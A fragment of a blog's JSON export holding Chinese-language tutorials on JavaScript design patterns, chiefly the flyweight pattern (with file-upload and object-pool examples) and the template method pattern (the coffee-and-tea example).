type=\"file\"/&gt;&lt;/form&gt;').appendTo($('body')); &#125;;var getUploadObj = getActiveUploadObj.after(getFlashUploadObj).after(getFormUpladObj);console.log(getUploadObj()); 小结在JavaScript开发中，职责链模式是最容易被忽视的模式之一。实际上只要运用得当，职责链模式可以很好地帮助我们管理代码，降低发起请求的对象和处理请求的对象之间的耦合性。职责链中的节点数量和顺序是可以自由变化的，我们可以在运行时决定链中包含哪些节点。 无论是作用域链、原型链，还是DOM节点中的事件冒泡，我们都能从中找到职责链模式的影子。职责链模式还可以和组合模式结合在一起，用来连接部件和父部件，或是提高组合对象的效率。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-11-享元模式","slug":"js-pattern11","date":"2017-11-27T13:35:57.000Z","updated":"2017-12-06T14:50:09.305Z","comments":true,"path":"2017/11/27/js-pattern11/","link":"","permalink":"https://github.com/xmoyKING/2017/11/27/js-pattern11/","excerpt":"","text":"享元（flyweight）模式是一种用于性能优化的模式，“fly”在这里是苍蝇的意思，意为蝇量级。享元模式的核心是运用共享技术来有效支持大量细粒度的对象。如果系统中因为创建了大量类似的对象而导致内存占用过高，享元模式就非常有用了。在JavaScript中，浏览器特别是移动端的浏览器分配的内存并不算多，如何节省内存就成了一件非常有意义的事情。享元模式的概念初听起来并不太好理解，所以在深入讲解之前，我们先看一个例子。 初识享元模式假设有个内衣工厂，目前的产品有50种男式内衣和50种女士内衣，为了推销产品，工厂决定生产一些塑料模特来穿上他们的内衣拍成广告照片。正常情况下需要50个男模特和50个女模特，然后让他们每人分别穿上一件内衣来拍照。不使用享元模式的情况下，在程序里也许会这样写：123456789101112131415var Model=function(sex,underwear)&#123; this.sex=sex; this.underwear=underwear;&#125;;Model.prototype.takePhoto=function()&#123; console.log('sex='+this.sex+' underwear='+this.underwear);&#125;;for(var i=1;i&lt;=50;i++)&#123; var maleModel=new Model('male','underwear'+i); maleModel.takePhoto();&#125;;for(var j=1;j&lt;=50;j++)&#123; var femaleModel=new Model('female','underwear'+j); femaleModel.takePhoto();&#125;; 要得到一张照片，每次都需要传入sex和underwear参数，如上所述，现在一共有50种男内衣和50种女内衣，所以一共会产生100个对象。如果将来生产了10000种内衣，那这个程序可能会因为存在如此多的对象已经提前崩溃。 下面我们来考虑一下如何优化这个场景。虽然有100种内衣，但很显然并不需要50个男模特和50个女模特。其实男模特和女模特各自有一个就足够了，他们可以分别穿上不同的内衣来拍照。现在来改写一下代码，既然只需要区别男女模特，那我们先把underwear参数从构造函数中移除，构造函数只接收sex参数：123456var Model=function(sex)&#123; this.sex=sex; &#125;;Model.prototype.takePhoto=function()&#123; console.log('sex='+this.sex+' underwear='+this.underwear);&#125;; 分别创建一个男模特对象和一个女模特对象：12var maleModel=new Model('male'),femaleModel=new Model('female'); 给男模特依次穿上所有的男装，并进行拍照：1234for(vari=1;i&lt;=50;i++)&#123; maleModel.underwear='underwear'+i; maleModel.takePhoto();&#125;; 同样，给女模特依次穿上所有的女装，并进行拍照,可以看到，改进之后的代码，只需要两个对象便完成了同样的功能。 内部状态与外部状态内衣例子便是享元模式的雏形，享元模式要求将对象的属性划分为内部状态与外部状态（状态在这里通常指属性）。享元模式的目标是尽量减少共享对象的数量，关于如何划分内部状态和外部状态，下面的几条经验提供了一些指引。 内部状态存储于对象内部。 内部状态可以被一些对象共享。 内部状态独立于具体的场景，通常不会改变。 外部状态取决于具体的场景，并根据场景而变化， 外部状态不能被共享。 这样一来，我们便可以把所有内部状态相同的对象都指定为同一个共享的对象。而外部状态可以从对象身上剥离出来，并储存在外部。 剥离了外部状态的对象成为共享对象，外部状态在必要时被传入共享对象来组装成一个完整的对象。虽然组装外部状态成为一个完整对象的过程需要花费一定的时间，但却可以大大减少系统中的对象数量，相比之下，这点时间或许是微不足道的。因此，享元模式是一种用时间换空间的优化模式。 在上面的例子中，性别是内部状态，内衣是外部状态，通过区分这两种状态，大大减少了系统中的对象数量。通常来讲，内部状态有多少种组合，系统中便最多存在多少个对象，因为性别通常只有男女两种，所以该内衣厂商最多只需要2个对象。 使用享元模式的关键是如何区别内部状态和外部状态。可以被对象共享的属性通常被划分为内部状态，如同不管什么样式的衣服，都可以按照性别不同，穿在同一个男模特或者女模特身上，模特的性别就可以作为内部状态储存在共享对象的内部。而外部状态取决于具体的场景，并根据场景而变化，就像例子中每件衣服都是不同的，它们不能被一些对象共享，因此只能被划分为外部状态。 享元模式的通用结构内衣例子初步展示了享元模式的威力，但这还不是一个完整的享元模式，在这个例子中还存在以下两个问题。 我们通过构造函数显式new出了男女两个model对象，在其他系统中，也许并不是一开始就需要所有的共享对象。 给model对象手动设置了underwear外部状态，在更复杂的系统中，这不是一个最好的方式，因为外部状态可能会相当复杂，它们与共享对象的联系会变得困难。 我们通过一个对象工厂来解决第一个问题，只有当某种共享对象被真正需要时，它才从工厂中被创建出来。对于第二个问题，可以用一个管理器来记录对象相关的外部状态，使这些外部状态通过某个钩子和共享对象联系起来。 文件上传的例子作者在微云上传模块的开发中，曾经借助享元模式提升了程序的性能。下面就讲述这个例子。 对象爆炸在微云上传模块的开发中，曾经经历过对象爆炸的问题。微云的文件上传功能虽然可以选择依照队列，一个一个地排队上传，但也支持同时选择2000个文件。每一个文件都对应着一个JavaScript上传对象的创建，在第一版开发中，的确往程序里同时new了2000个upload对象，结果可想而知，Chrome中还勉强能够支撑，IE下直接进入假死状态。 微云支持好几种上传方式，比如浏览器插件、Flash和表单上传等，为了简化例子，我们先假设只有插件和Flash这两种。不论是插件上传，还是Flash上传，原理都是一样的，当用户选择了文件之后，插件和Flash都会通知调用Window下的一个全局JavaScript函数，它的名字是startUpload，用户选择的文件列表被组合成一个数组files塞进该函数的参数列表里，代码如下：1234567var id = 0;window.startUpload = function(uploadType, files) &#123; // uploadType 区 分 是 控 件 还 是 flash for (var i = 0, file; file = files[i++];) &#123; var uploadObj = new Upload(uploadType, file.fileName, file.fileSize); uploadObj.init(id++); // 给 upload 对 象 设 置 一 个 唯 一 的 id &#125;&#125;; 当用户选择完文件之后，startUpload函数会遍历files数组来创建对应的upload对象。接下来定义Upload构造函数，它接受3个参数，分别是插件类型、文件名和文件大小。这些信息都已经被插件组装在files数组里返回，代码如下：12345678910111213141516var Upload = function(uploadType, fileName, fileSize) &#123; this.uploadType = uploadType; this.fileName = fileName; this.fileSize = fileSize; this.dom = null; &#125;;Upload.prototype.init = function(id) &#123; var that = this; this.id = id; this.dom = document.createElement('div'); this.dom.innerHTML = '&lt;span&gt;文件名称:'+this.fileName+',文件大小:'+this.fileSize+'&lt;/span&gt;'+'&lt;buttonclass=\"delFile\"&gt;删除&lt;/button&gt;'; this.dom.querySelector('.delFile').onclick = function() &#123; that.delFile(); &#125; document.body.appendChild(this.dom);&#125;; 同样为了简化示例，暂且去掉了upload对象的其他功能，只保留删除文件的功能，对应的方法是Upload.prototype.delFile。该方法中有一个逻辑：当被删除的文件小于3000KB时，该文件将被直接删除。否则页面中会弹出一个提示框，提示用户是否确认要删除该文件，代码如下：12345678Upload.prototype.delFile = function() &#123; if (this.fileSize &lt; 3000) &#123; return this.dom.parentNode.removeChild(this.dom); &#125; if (window.confirm('确 定 要 删 除 该 文 件 吗? ' + this.fileName)) &#123; return this.dom.parentNode.removeChild(this.dom); &#125;&#125;; 接下来分别创建3个插件上传对象和3个Flash上传对象：123456789101112131415161718192021startUpload('plugin', [&#123; fileName: '1.txt', fileSize: 1000&#125;, &#123; fileName: '2.html', fileSize: 3000&#125;, &#123; fileName: '3.txt', fileSize: 5000&#125;]);startUpload('flash', [&#123; fileName: '4.txt', fileSize: 1000&#125;, &#123; fileName: '5.html', fileSize: 3000&#125;, &#123; fileName: '6.txt', fileSize: 5000&#125;]); 当点击删除最后一个文件时弹出了是否确认删除的提示 享元模式重构文件上传第一版的文件上传代码里有多少个需要上传的文件，就一共创建了多少个upload对象，接下来用享元模式重构它。 首先，我们需要确认插件类型uploadType是内部状态，那为什么单单uploadType是内部状态呢？前面讲过，划分内部状态和外部状态的关键主要有以下几点。 内部状态储存于对象内部。 内部状态可以被一些对象共享。 内部状态独立于具体的场景，通常不会改变。 外部状态取决于具体的场景，并根据场景而变化，外部状态不能被共享。 在文件上传的例子里，upload对象必须依赖uploadType属性才能工作，这是因为插件上传、Flash上传、表单上传的实际工作原理有很大的区别，它们各自调用的接口也是完全不一样的，必须在对象创建之初就明确它是什么类型的插件，才可以在程序的运行过程中，让它们分别调用各自的start、pause、cancel、del等方法。 实际上在微云的真实代码中，虽然插件和Flash上传对象最终创建自一个大的工厂类，但它们实际上根据uploadType值的不同，分别是来自于两个不同类的对象。（目前为了简化代码，把插件和Flash的构造函数合并成了一个。） 一旦明确了uploadType，无论我们使用什么方式上传，这个上传对象都是可以被任何文件共用的。而fileName和fileSize是根据场景而变化的，每个文件的fileName和fileSize都不一样，fileName和fileSize没有办法被共享，它们只能被划分为外部状态。 剥离外部状态明确了uploadType作为内部状态之后，我们再把其他的外部状态从构造函数中抽离出来，Upload构造函数中只保留uploadType参数：1var Upload = function( uploadType)&#123; this.uploadType = uploadType; &#125;; Upload.prototype.init函数也不再需要，因为upload对象初始化的工作被放在了uploadManager.add函数里面，接下来只需要定义Upload.prototype.del函数即可：123456789Upload.prototype.delFile = function(id) &#123; uploadManager.setExternalState(id, this); // (1) if (this.fileSize &lt; 3000) &#123; return this.dom.parentNode.removeChild(this.dom); &#125; if (window.confirm('确 定 要 删 除 该 文 件 吗? ' + this.fileName)) &#123; return this.dom.parentNode.removeChild(this.dom); &#125;&#125;; 在开始删除文件之前，需要读取文件的实际大小，而文件的实际大小被储存在外部管理器uploadManager中，所以在这里需要通过uploadManager.setExternalState方法给共享对象设置正确的fileSize，上段代码中的(1)处表示把当前id对应的对象的外部状态都组装到共享对象中。 工厂进行对象实例化工厂进行对象实例化接下来定义一个工厂来创建upload对象，如果某种内部状态对应的共享对象已经被创建过，那么直接返回这个对象，否则创建一个新的对象：1234567891011var UploadFactory = (function() &#123; var createdFlyWeightObjs = &#123;&#125;; return &#123; create: function(uploadType) &#123; if (createdFlyWeightObjs[uploadType]) &#123; return createdFlyWeightObjs[uploadType]; &#125; return createdFlyWeightObjs[uploadType] = new Upload(uploadType); &#125; &#125;&#125;)(); 管理器封装外部状态现在我们来完善前面提到的uploadManager对象，它负责向UploadFactory提交创建对象的请求，并用一个uploadDatabase对象保存所有upload对象的外部状态，以便在程序运行过程中给upload共享对象设置外部状态，代码如下：12345678910111213141516171819202122232425262728var uploadManager = (function() &#123; var uploadDatabase = &#123;&#125;; return &#123; add: function(id, uploadType, fileName, fileSize) &#123; var flyWeightObj = UploadFactory.create(uploadType); var dom = document.createElement('div'); dom.innerHTML = '&lt;span&gt;文件名称:'+fileName+',文件大小:'+fileSize+'&lt;/span&gt;'+'&lt;buttonclass=\"delFile\"&gt;删除&lt;/button&gt;'; dom.querySelector('.delFile').onclick = function() &#123; flyWeightObj.delFile(id); &#125; document.body.appendChild(dom); uploadDatabase[id] = &#123; fileName: fileName, fileSize: fileSize, dom: dom &#125;; return flyWeightObj; &#125;, setExternalState: function(id, flyWeightObj) &#123; var uploadData = uploadDatabase[id]; for (var i in uploadData) &#123; flyWeightObj[i] = uploadData[i]; &#125; &#125; &#125;&#125;)(); 然 后 是 开 始 触 发 上 传 动 作 的 startUpload 函 数：123456var id = 0;window.startUpload = function(uploadType, files) &#123; for (var i = 0, file; file = files[i++];) &#123; var uploadObj = uploadManager.add(++id, uploadType, file.fileName, file.fileSize); &#125;&#125;; 最后是测试时间，运行测试的代码后，可以发现运行结果跟用享元模式重构之前一致 享元模式重构之前的代码里一共创建了6个upload对象，而通过享元模式重构之后，对象的数量减少为2，更幸运的是，就算现在同时上传2000个文件，需要创建的upload对象数量依然是2。 享元模式的适用性享元模式是一种很好的性能优化方案，但它也会带来一些复杂性的问题，从前面两组代码的比较可以看到，使用了享元模式之后，我们需要分别多维护一个factory对象和一个manager对象，在大部分不必要使用享元模式的环境下，这些开销是可以避免的。 享元模式带来的好处很大程度上取决于如何使用以及何时使用，一般来说，以下情况发生时便可以使用享元模式。 一个程序中使用了大量的相似对象。 由于使用了大量对象，造成很大的内存开销。 对象的大多数状态都可以变为外部状态。 剥离出对象的外部状态之后，可以用相对较少的共享对象取代大量对象。可以看到，文件上传的例子完全符合这四点。 再谈内部状态和外部状态如果顺利的话，通过前面的例子我们已经了解了内部状态和外部状态的概念以及享元模式的工作原理。我们知道，实现享元模式的关键是把内部状态和外部状态分离开来。有多少种内部状态的组合，系统中便最多存在多少个共享对象，而外部状态储存在共享对象的外部，在必要时被传入共享对象来组装成一个完整的对象。现在来考虑两种极端的情况，即对象没有外部状态和没有内部状态的时候。 没有内部状态的享元在文件上传的例子中，我们分别进行过插件调用和Flash调用，即startUpload(‘plugin’,[])和startUpload(‘flash’,[])，导致程序中创建了内部状态不同的两个共享对象。也许你会奇怪，在文件上传程序里，一般都会提前通过特性检测来选择一种上传方式，如果浏览器支持插件就用插件上传，如果不支持插件，就用Flash上传。那么，什么情况下既需要插件上传又需要Flash上传呢？ 实际上这个需求是存在的，很多网盘都提供了极速上传（控件）与普通上传（Flash）两种模式，如果极速上传不好使（可能是没有安装控件或者控件损坏），用户还可以随时切换到普通上传模式，所以这里确实是需要同时存在两个不同的upload共享对象。 但不是每个网站都必须做得如此复杂，很多小一些的网站就只支持单一的上传方式。假设我们是这个网站的开发者，不需要考虑极速上传与普通上传之间的切换，这意味着在之前的代码中作为内部状态的uploadType属性是可以删除掉的。 在继续使用享元模式的前提下，构造函数Upload就变成了无参数的形式：var Upload = function(){}; 其他属性如fileName、fileSize、dom依然可以作为外部状态保存在共享对象外部。在uploadType作为内部状态的时候，它可能为控件，也可能为Flash，所以当时最多可以组合出两个共享对象。而现在已经没有了内部状态，这意味着只需要唯一的一个共享对象。现在我们要改写创建享元对象的工厂，代码如下：1234567891011var UploadFactory = (function() &#123; var uploadObj; return &#123; create: function() &#123; if (uploadObj) &#123; return uploadObj; &#125; return uploadObj = new Upload(); &#125; &#125;&#125;)(); 管理器部分的代码不需要改动，还是负责剥离和组装外部状态。可以看到，当对象没有内部状态的时候，生产共享对象的工厂实际上变成了一个单例工厂。虽然这时候的共享对象没有内部状态的区分，但还是有剥离外部状态的过程，我们依然倾向于称之为享元模式。 没有外部状态的享元网上许多资料中，经常把Java或者C#的字符串看成享元，这种说法是否正确呢？通过下面这段Java代码来分析一下：12345678// Java 代 码 public class Test &#123; public static void main(String args[]) &#123; String a1 = new String(\"a\").intern(); String a2 = new String(\"a\").intern(); System.out.println(a1 == a2); // true &#125;&#125; 在这段Java代码里，分别new了两个字符串对象a1和a2。intern是一种对象池技术，newString(“a”).intern()的含义如下。 如果值为a的字符串对象已经存在于对象池中，则返回这个对象的引用。 反之，将字符串a的对象添加进对象池，并返回这个对象的引用。 所以a1==a2的结果是true，但这并不是使用了享元模式的结果，享元模式的关键是区别内部状态和外部状态。享元模式的过程是剥离外部状态，并把外部状态保存在其他地方，在合适的时刻再把外部状态组装进共享对象。这里并没有剥离外部状态的过程，a1和a2指向的完全就是同一个对象，所以如果没有外部状态的分离，即使这里使用了共享的技术，但并不是一个纯粹的享元模式。 对象池前面已经提到了Java中String的对象池，这是一种共享的技术。对象池维护一个装载空闲对象的池子，如果需要对象的时候，不是直接new，而是转从对象池里获取。如果对象池里没有空闲对象，则创建一个新的对象，当获取出的对象完成它的职责之后，再进入池子等待被下次获取。 对象池的原理很好理解，比如我们组人手一本《JavaScript权威指南》，从节约的角度来讲，这并不是很划算，因为大部分时间这些书都被闲置在各自的书架上，所以我们一开始就只买一本，或者一起建立一个小型图书馆（对象池），需要看书的时候就从图书馆里借，看完了之后再把书还回图书馆。 如果同时有三个人要看这本书，而现在图书馆里只有两本，那我们再马上去书店买一本放入图书馆。对象池技术的应用非常广泛，HTTP连接池和数据库连接池都是其代表应用。在Web前端开发中，对象池使用最多的场景大概就是跟DOM有关的操作。很多空间和时间都消耗在了DOM节点上，如何避免频繁地创建和删除DOM节点就成了一个有意义的话题。 对象池实现假设我们在开发一个地图应用，地图上经常会出现一些标志地名的小气泡，我们叫它toolTip。 在搜索我家附近地图的时候，页面里出现了2个小气泡。当我再搜索附近的兰州拉面馆时，页面中出现了6个小气泡。按照对象池的思想，在第二次搜索开始之前，并不会把第一次创建的2个小气泡删除掉，而是把它们放进对象池。这样在第二次的搜索结果页面里，我们只需要再创建4个小气泡而不是6个. 先定义一个获取小气泡节点的工厂，作为对象池的数组成为私有属性被包含在工厂闭包里，这个工厂有两个暴露对外的方法，create表示获取一个div节点，recover表示回收一个div节点：123456789101112131415161718var toolTipFactory = (function() &#123; var toolTipPool = []; // toolTip 对 象 池 return &#123; create: function() &#123; if (toolTipPool.length === 0) &#123; // 如 果 对 象 池 为 空 var div = document.createElement('div'); // 创 建 一 个 dom document.body.appendChild(div); return div; &#125; else &#123; // 如 果 对 象 池 里 不 为 空 return toolTipPool.shift(); // 则 从 对 象 池 中 取 出 一 个 dom &#125; &#125;, recover: function(tooltipDom) &#123; return toolTipPool.push(tooltipDom); // 对 象 池 回 收 dom &#125; &#125;&#125;)(); 现在把时钟拨回进行第一次搜索的时刻，目前需要创建2个小气泡节点，为了方便回收，用一个数组ary来记录它们：123456var ary = [];for (var i = 0, str; str = ['A', 'B'][i++];) &#123; var toolTip = toolTipFactory.create(); toolTip.innerHTML = str; ary.push(toolTip);&#125;; 如果你愿意稍稍测试一下，可以看到页面中出现了innerHTML分别为A和B的两个div节点。 接下来假设地图需要开始重新绘制，在此之前要把这两个节点回收进对象池：123for (var i = 0, toolTip; toolTip = ary[i++];) &#123; toolTipFactory.recover(toolTip);&#125;; 再创建6个小气泡：1234for (var i = 0, str; str = ['A', 'B', 'C', 'D', 'E', 'F'][i++];) &#123; var toolTip = toolTipFactory.create(); toolTip.innerHTML = str;&#125;; 现在再测试一番，页面中出现了内容分别为A、B、C、D、E、F的6个节点，上一次创建好的节点被共享给了下一次操作。对象池跟享元模式的思想有点相似，虽然innerHTML的值A、B、C、D等也可以看成节点的外部状态，但在这里我们并没有主动分离内部状态和外部状态的过程。 通用对象池实现我们还可以在对象池工厂里，把创建对象的具体过程封装起来，实现一个通用的对象池：123456789101112var objectPoolFactory = function(createObjFn) &#123; var objectPool = []; return &#123; create: function() &#123; var obj = objectPool.length === 0 ? createObjFn.apply(this, arguments) : objectPool.shift(); return obj; &#125;, recover: function(obj) &#123; objectPool.push(obj); &#125; &#125;&#125;; 使用如下，比如利用objectPoolFactory来创建一个装载一些iframe的对象池：1234567891011121314151617var iframeFactory = objectPoolFactory(function() &#123; var iframe = document.createElement('iframe'); document.body.appendChild(iframe); iframe.onload = function() &#123; iframe.onload = null; // 防 止 iframe 重 复 加 载 的 bug iframeFactory.recover(iframe); // iframe 加 载 完 成 之 后 回 收 节 点 &#125; return iframe;&#125;);var iframe1 = iframeFactory.create();iframe1.src = 'http://baidu.com';var iframe2 = iframeFactory.create();iframe2.src = 'http://QQ.com';setTimeout(function() &#123; var iframe3 = iframeFactory.create(); iframe3.src = 'http://163.com';&#125;, 3000); 对象池是另外一种性能优化方案，它跟享元模式有一些相似之处，但没有分离内部状态和外部状态这个过程。用享元模式完成的文件上传的例子，其实也可以用对象池+事件委托来代替实现。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-10-模板方法模式","slug":"js-pattern10","date":"2017-11-24T13:06:31.000Z","updated":"2017-12-06T14:50:09.305Z","comments":true,"path":"2017/11/24/js-pattern10/","link":"","permalink":"https://github.com/xmoyKING/2017/11/24/js-pattern10/","excerpt":"","text":"在JavaScript开发中用到继承的场景其实并不是很多，很多时候我们都喜欢用mix-in的方式给对象扩展属性。但这不代表继承在JavaScript里没有用武之地，虽然没有真正的类和继承机制，但我们可以通过原型prototype来变相地实现继承。模板方法（TemplateMethod）模式是一种基于继承的设计模式 模板方法模式的定义和组成模板方法模式是一种只需使用继承就可以实现的非常简单的模式。模板方法模式由两部分结构组成，第一部分是抽象父类，第二部分是具体的实现子类。通常在抽象父类中封装了子类的算法框架，包括实现一些公共方法以及封装子类中所有方法的执行顺序。子类通过继承这个抽象类，也继承了整个算法结构，并且可以选择重写父类的方法。 假如我们有一些平行的子类，各个子类之间有一些相同的行为，也有一些不同的行为。如果相同和不同的行为都混合在各个子类的实现中，说明这些相同的行为会在各个子类中重复出现。但实际上，相同的行为可以被搬移到另外一个单一的地方，模板方法模式就是为解决这个问题而生的。在模板方法模式中，子类实现中的相同部分被上移到父类中，而将不同的部分留待子类来实现。这也很好地体现了泛化的思想。 第一个例子——CoffeeorTea咖啡与茶是一个经典的例子，经常用来讲解模板方法模式，这个例子的原型来自《HeadFirst设计模式》。用JavaScript来实现这个例子。 先泡一杯咖啡首先，我们先来泡一杯咖啡，如果没有什么太个性化的需求，泡咖啡的步骤通常如下： 把水煮沸 用沸水冲泡咖啡 把咖啡倒进杯子 加糖和牛奶通过下面这段代码，我们就能得到一杯香浓的咖啡：123456789101112131415161718192021var Coffee = function() &#123;&#125;;Coffee.prototype.boilWater = function() &#123; console.log('把 水 煮 沸');&#125;;Coffee.prototype.brewCoffeeGriends = function() &#123; console.log('用 沸 水 冲 泡 咖 啡');&#125;;Coffee.prototype.pourInCup = function() &#123; console.log('把 咖 啡 倒 进 杯 子');&#125;;Coffee.prototype.addSugarAndMilk = function() &#123; console.log('加 糖 和 牛 奶');&#125;;Coffee.prototype.init = function() &#123; this.boilWater(); this.brewCoffeeGriends(); this.pourInCup(); this.addSugarAndMilk();&#125;;var coffee = new Coffee();coffee.init(); 泡一壶茶接下来，开始准备我们的茶，泡茶的步骤跟泡咖啡的步骤相差并不大： 把水煮沸 用沸水浸泡茶叶 把茶水倒进杯子 加柠檬同样用一段代码来实现泡茶的步骤:123456789101112131415161718192021var Tea = function() &#123;&#125;;Tea.prototype.boilWater = function() &#123; console.log('把 水 煮 沸');&#125;;Tea.prototype.steepTeaBag = function() &#123; console.log('用 沸 水 浸 泡 茶 叶');&#125;;Tea.prototype.pourInCup = function() &#123; console.log('把 茶 水 倒 进 杯 子');&#125;;Tea.prototype.addLemon = function() &#123; console.log('加 柠 檬');&#125;;Tea.prototype.init = function() &#123; this.boilWater(); this.steepTeaBag(); this.pourInCup(); this.addLemon();&#125;;var tea = new Tea();tea.init(); 分离出共同点现在我们分别泡好了一杯咖啡和一壶茶，经过思考和比较，我们发现咖啡和茶的冲泡过程是大同小异的， 我们找到泡咖啡和泡茶主要有以下不同点。 原料不同。一个是咖啡，一个是茶，但我们可以把它们都抽象为“饮料”。 泡的方式不同。咖啡是冲泡，而茶叶是浸泡，我们可以把它们都抽象为“泡”。 加入的调料不同。一个是糖和牛奶，一个是柠檬，但我们可以把它们都抽象为“调料”。经过抽象之后，不管是泡咖啡还是泡茶，我们都能整理为下面四步： 把水煮沸 用沸水冲泡饮料 把饮料倒进杯子 加调料所以，不管是冲泡还是浸泡，我们都能给它一个新的方法名称，比如说brew()。同理，不管是加糖和牛奶，还是加柠檬，我们都可以称之为addCondiments()。让我们忘记最开始创建的Coffee类和Tea类。现在可以创建一个抽象父类来表示泡一杯饮料的整个过程。不论是Coffee，还是Tea，都被我们用Beverage来表示，代码如下：12345678910111213var Beverage = function() &#123;&#125;;Beverage.prototype.boilWater = function() &#123; console.log('把 水 煮 沸');&#125;;Beverage.prototype.brew = function() &#123;&#125;; // 空 方 法， 应 该 由 子 类 重 写 Beverage.prototype.pourInCup = function() &#123;&#125;; // 空 方 法， 应 该 由 子 类 重 写 Beverage.prototype.addCondiments = function() &#123;&#125;; // 空 方 法， 应 该 由 子 类 重 写 Beverage.prototype.init = function() &#123; this.boilWater(); this.brew(); this.pourInCup(); this.addCondiments();&#125;; 创建Coffee子类和Tea子类现在创建一个Beverage类的对象对我们来说没有意义，因为世界上能喝的东西没有一种真正叫“饮料”的，饮料在这里还只是一个抽象的存在。接下来我们要创建咖啡类和茶类，并让它们继承饮料类：12var Coffee = function()&#123;&#125;; Coffee.prototype = new Beverage(); 接下来要重写抽象父类中的一些方法，只有“把水煮沸”这个行为可以直接使用父类Beverage中的boilWater方法，其他方法都需要在Coffee子类中重写，代码如下：1234567891011Coffee.prototype.brew = function() &#123; console.log('用 沸 水 冲 泡 咖 啡');&#125;;Coffee.prototype.pourInCup = function() &#123; console.log('把 咖 啡 倒 进 杯 子');&#125;;Coffee.prototype.addCondiments = function() &#123; console.log('加 糖 和 牛 奶');&#125;;var Coffee = new Coffee();Coffee.init(); 至此我们的Coffee类已经完成了，当调用coffee对象的init方法时，由于coffee对象和Coffee构造器的原型prototype上都没有对应的init方法，所以该请求会顺着原型链，被委托给Coffee的“父类”Beverage原型上的init方法。 而Beverage.prototype.init方法中已经规定好了泡饮料的顺序，所以我们能成功地泡出一杯咖啡，代码如下：123456Beverage.prototype.init = function() &#123; this.boilWater(); this.brew(); this.pourInCup(); this.addCondiments();&#125;; 接下来照葫芦画瓢，来创建我们的Tea类. 一直讨论的是模板方法模式，那么在上面的例子中，到底谁才是所谓的模板方法呢？答案是Beverage.prototype.init。 Beverage.prototype.init被称为模板方法的原因是，该方法中封装了子类的算法框架，它作为一个算法的模板，指导子类以何种顺序去执行哪些方法。在Beverage.prototype.init方法中，算法内的每一个步骤都清楚地展示在我们眼前。 抽象类首先要说明的是，模板方法模式是一种严重依赖抽象类的设计模式。JavaScript在语言层面并没有提供对抽象类的支持，我们也很难模拟抽象类的实现。将着重讨论Java中抽象类的作用，以及JavaScript没有抽象类时所做出的让步和变通。 抽象类的作用在Java中，类分为两种，一种为具体类，另一种为抽象类。具体类可以被实例化，抽象类不能被实例化。要了解抽象类不能被实例化的原因，我们可以思考“饮料”这个抽象类。 想象这样一个场景：我们口渴了，去便利店想买一瓶饮料，我们不能直接跟店员说：“来一瓶饮料。”如果我们这样说了，那么店员接下来肯定会问：“要什么饮料？”饮料只是一个抽象名词，只有当我们真正明确了的饮料类型之后，才能得到一杯咖啡、茶、或者可乐。 由于抽象类不能被实例化，如果有人编写了一个抽象类，那么这个抽象类一定是用来被某些具体类继承的。 抽象类和接口一样可以用于向上转型（可参考关于多态的内容），在静态类型语言中，编译器对类型的检查总是一个绕不过的话题与困扰。虽然类型检查可以提高程序的安全性，但繁琐而严格的类型检查也时常会让程序员觉得麻烦。把对象的真正类型隐藏在抽象类或者接口之后，这些对象才可以被互相替换使用。这可以让我们的Java程序尽量遵守依赖倒置原则。 除了用于向上转型，抽象类也可以表示一种契约。继承了这个抽象类的所有子类都将拥有跟抽象类一致的接口方法，抽象类的主要作用就是为它的子类定义这些公共接口。如果我们在子类中删掉了这些方法中的某一个，那么将不能通过编译器的检查，这在某些场景下是非常有用的，比如模板方法模式，Beverage类的init方法里规定了冲泡一杯饮料的顺序如下：1234this.boilWater();this.brew();this.pourInCup();this.addCondiments(); 如果在Coffee子类中没有实现对应的brew方法，那么我们百分之百得不到一杯咖啡。既然父类规定了子类的方法和执行这些方法的顺序，子类就应该拥有这些方法，并且提供正确的实现。 抽象方法和具体方法抽象方法被声明在抽象类中，抽象方法并没有具体的实现过程，是一些“哑”方法。比如Beverage类中的brew方法、pourInCup方法和addCondiments方法，都被声明为抽象方法。当子类继承了这个抽象类时，必须重写父类的抽象方法。 除了抽象方法之外，如果每个子类中都有一些同样的具体实现方法，那这些方法也可以选择放在抽象类中，这可以节省代码以达到复用的效果，这些方法叫作具体方法。当代码需要改变时，我们只需要改动抽象类里的具体方法就可以了。比如饮料中的boilWater方法，假设冲泡所有的饮料之前，都要先把水煮沸，那我们自然可以把boilWater方法放在抽象类Beverage中。 JavaScript没有抽象类的缺点和解决方案JavaScript并没有从语法层面提供对抽象类的支持。抽象类的第一个作用是隐藏对象的具体类型，由于JavaScript是一门“类型模糊”的语言，所以隐藏对象的类型在JavaScript中并不重要。 另一方面，当我们在JavaScript中使用原型继承来模拟传统的类式继承时，并没有编译器帮助我们进行任何形式的检查，我们也没有办法保证子类会重写父类中的“抽象方法”。 我们知道，Beverage.prototype.init方法作为模板方法，已经规定了子类的算法框架. 如果我们的Coffee类或者Tea类忘记实现这4个方法中的一个呢？拿brew方法举例，如果我们忘记编写Coffee.prototype.brew方法，那么当请求coffee对象的brew时，请求会顺着原型链找到Beverage“父类”对应的Beverage.prototype.brew方法，而Beverage.prototype.brew方法到目前为止是一个空方法，这显然是不能符合我们需要的。 在Java中编译器会保证子类会重写父类中的抽象方法，但在JavaScript中却没有进行这些检查工作。我们在编写代码的时候得不到任何形式的警告，完全寄托于程序员的记忆力和自觉性是很危险的，特别是当我们使用模板方法模式这种完全依赖继承而实现的设计模式时。 下面提供两种变通的解决方案。 第1种方案是用鸭子类型来模拟接口检查，以便确保子类中确实重写了父类的方法。但模拟接口检查会带来不必要的复杂性，而且要求程序员主动进行这些接口检查，这就要求我们在业务代码中添加一些跟业务逻辑无关的代码。 第2种方案是让Beverage.prototype.brew等方法直接抛出一个异常，如果因为粗心忘记编写Coffee.prototype.brew方法，那么至少我们会在程序运行时得到一个错误：12Beverage.prototype.brew = function()&#123; throw new Error( '子 类 必 须 重 写 brew 方 法' ); &#125;; Beverage.prototype.pourInCup = function()&#123; throw new Error( '子 类 必 须 重 写 pourInCup 方 法' ); &#125;; 第2种解决方案的优点是实现简单，付出的额外代价很少；缺点是我们得到错误信息的时间点太靠后。 